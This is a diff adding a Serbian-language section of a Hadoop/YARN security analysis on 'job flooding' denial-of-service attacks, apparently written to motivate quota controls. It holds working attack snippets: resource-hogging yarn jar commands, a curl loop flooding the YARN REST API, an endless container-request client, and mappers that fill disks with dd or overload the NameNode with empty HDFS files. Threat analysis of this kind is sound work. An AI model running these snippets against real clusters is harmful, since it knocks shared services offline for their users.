@@ -676,6 +676,122 @@ Sledi specifikacija jedne opšte bezbednosne kontrole, koju je dobro primenjivat
 banned.users=alice
 ```
 
+<a id="A4122"></a>
+# A4122. Zasipanje poslovima
+
+Zasipanje poslova predstavlja situaciju gde napadač kreira veću količinu poslova (spamuje). Ova klasa napada je slična sa prethodnom (_[A4121](#A4121)_), zbog toga se zajednički delovi analize neće ponavljati. Ova klasa napada može biti uzrokovana i samo pohlepnošću radnika za resursima, a ne nužno malicioznošću. Ako se posmatraju napadi, fokus je na ugrožavanju bezbednosnog svojstva dostupnosti servisa. Ako se posmatraju bezbednosne kontrole, fokus je na uvođenju kvota.  Motiv za analizom ovakve klase napada je visoka verovatnoća realizacije, bez obzira što je negativan uticaj ocenjen kao srednje umeren. Relativno se lako izvodi, vrlo je intuitivna, i stoga se često sreće u praksi. Prema procenjenom riziku obavezno joj se treba posvetiti. Biće ilustrovano više varijacija napada kako bi se jasno ilustrovale ideje napadača. Primetno je da se bezbednosne kontrole, kao odgovor na pretnje, očekivano preklapaju kako istraživanje napreduje. 
+
+Ključne karakteristike ove klase napada su:
+- Maliciozno korišćenje (alociranje) resursa.
+- Pokretanje veće količine poslova.
+- Ugrožavanje dostupnosti.
+
+## Kreiranje visoko zahtevnih poslova
+Jedna od prvih ideja koje može pasti napadaču na pamet jeste pokušaj alociranja velike količine resursa. Ovakav napad je posebno opasan ukoliko se beskonačno dugo izvršava i ukoliko se multiplikuje. Potrebno je napomenuti da specifikacija resursa nije samo _hint_ procesoru, već direktiva za ispunjenje tražene količine resursa. 
+
+- `yarn jar app.jar App`, komanda za pokretanje prethodno iskompajliranog i spremljenog posla u `.jar` format.
+- `yarn.app.mapreduce.am.resource.mb`, količina radne memorije koja će se alocirati.
+- `yarn.app.mapreduce.am.resource.cpu-vcores`, količina jezgara centralnog procesora koja će se alocirati.
+- `mapreduce.task.timeout = 0`, uslov za beskonačno izvršavanje posla.
+
+``` sh
+yarn jar job.jar App                               \
+    -Dyarn.app.mapreduce.am.resource.mb=8192       \
+    -Dyarn.app.mapreduce.am.resource.cpu-vcores=16 \
+    -Dmapreduce.task.timeout=0
+```
+_Ovo je ujedno bio i prikaz pokretanja posla napisanog u _Java_ programskom jeziku._
+
+## Kreiranje velike količine nisko zahtevnih poslova
+Ovo predstavlja razradu prethodnog slučaja, pri čemu je ideja da se kreira beskonačno velika količina poslova sa više ili manje resursa. Često je moguće zaobići resursne kvote kroz veće količine nisko zahtevnih poslova.
+#### i.
+Kreiranje maliciozne _mapper_ funkcije.
+``` sh
+while true; do
+  yarn jar job.jar job -Dmapreduce.map.memory.mb=512
+done
+```
+
+#### ii.
+Ovako bi mogao izgledati napad na _YARN REST API_. U pitanju je već viđena struktura, pri čemu je naglasak na tipu napada koji kreira veliku količinu nisko zahtevnih poslova.
+``` sh
+for i in $(seq 1 10000); do
+    curl -X POST -H "Content-Type: application/json"               \
+        -d '{
+            "application-id": "job_'"$i"'",
+            "application-name": "job_name_'"$i"'",
+            "am-container-spec": {
+                "commands": {
+                    "command": ["sleep", "3600"]
+                }
+            },
+            "max-app-attempts": 1,
+            "resource": {
+                "memory": 128,
+                "vCores": 1
+            }
+        }'                                                         \
+        --negotiate -u:                                            \
+        http://edge-node:8088/ws/v1/cluster/apps/new-application
+done
+```
+## Izvršavanje napada od strane malicizone aplikacije
+
+Sledeći primer ilustruje napad direktno iz aplikacije koja koristi _Hadoop_ klaster [[16]](#[16]). Dakle, nije u pitanju terminal sesija, ili javno dostupan _REST API_ servis. Radi se o napadu sa većom tehničkom složenošću. Suština je u pokretanju ogromnog broja kontejnera, uz direktnije obraćanje _ApplicationMaster_ komponenti. Ovde se ističe onaj deo granice poverenja koji se tiče zavisnosti ka drugim aplikacijama, a ne ljudima.
+``` java
+public class JobConfigurationByClientApp {
+  public static void main(String[] args) throws Exception {
+    
+    AMRMClient<AMRMClient.ContainerRequest> rmClient = AMRMClient.createAMRMClient();
+    rmClient.init(new YarnConfiguration());
+    rmClient.start();
+    rmClient.registerApplicationMaster("", 0, "");
+    
+    while (true) {
+      for (int i = 0; i < 1000; i++) {
+        Resource resource = Resource.newInstance(1024, 1);
+        AMRMClient.ContainerRequest req = new AMRMClient.ContainerRequest(
+          resource, null, null, Priority.newInstance(0)
+        );
+        rmClient.addContainerRequest(req);
+      }
+      Thread.sleep(5000);
+    }
+  }
+}
+```
+## Neograničeno upisivanje podataka u lokalnom fajl sistemu
+
+Interesantna varijacija posmatrane klase napada. Napadač može pokušati sa preteranim upisom ogromnih količina podataka (direktno ili posredno). Na taj način vrlo lako može istrošiti sve memorijske kapacitete klastera. Komadnom `dd` ce pokusati upis 1TB podataka. Na ulazu je _zero_ bajt fajl, `if=/dev/zero`. Zatim će biti specificirana putanja izlaznog fajla u lokalnom fajl sistemu, `of={file_name}`. Veličina bloka je 1 GB, `bs=1G`. Ukupno će biti upisano 1000 blokova, `count=1000`. Dat je primer definisanja _payload-a_ kao _mapper-a_, čime se na svim alociranim _mapper_ kontejnerima postiže izvršavanje.
+``` py
+def mapper(num_files=100):
+  for i in range(num_files):
+    file_name = f'./junk_{i}.bin'
+    command = f"dd if=/dev/zero of={file_name} bs=1G count=1000"
+    os.system(command)
+```
+
+## Neograničeno upisivanje podataka u fajl sistemu _Hadoop_ modula
+
+Izvršiće se upis podataka u _DataNode_ čvorovima, kao i metapodataka u _NameNode_ čvoru. Skladištenje podataka se vrši unutar _HDFS_ komponente, a ne u lokalnom fajl sistemu. Ovaj napad je primarno fokusiran na opterećenje _NameNode_ čvora, iako je moguće primeniti i obrnuti pristup. Napadom na _NameNode_ čvor se lako postiže nedostupnost čitavog klastera, pošto je u pitanju _Single point of failure_ čvor. Komandom `hdfs dfs -touchz` će se napraviti prazan fajl na _HDFS_ komponenti. Iako je svaki fajl prazan, on ipak ima metapodatke i opterećuje _NameNode_. Dat je primer definisanja _payload-a_ kao _mapper-a_, čime se na svim alociranim _mapper_ kontejnerima postiže izvršavanje.
+``` py
+def mapper(num_files=100000):
+  for i in range(100000):
+    file_name = f"/spamjob/file_{i}"
+    command = f"hdfs dfs -touchz {file_name}"
+    os.system(command)
+```
+## Odbacivanje _NodeManager_ čvora
+
+Sledeći posao simulira neuspešno izvršavanje i izlaz sa _error_ kodom. Ovakav posao uzrokuje pokušaje ponovnog izvršavanja, radi oporavka. Mnoštvo ovakvih poslova će izazvati zagušenje klastera po pitanju resursa. Ukoliko se u kraćem vremenskom periodu desi otkazivanje većine poslova na nekom čvoru, to dovodi do odbacivanja čvora od strane _YARN_ komponente. Reč je o vrlo trivijalnom napadu koji je vrlo efektan.
+``` java
+public class Mapper {
+  public static void main(String[] args) throws Exception {
+    Thread.sleep(random.nextInt(1000));
+    System.exit(1); 
+  }
+}
+```
 # Reference
 
 <a id="[1]"></a>
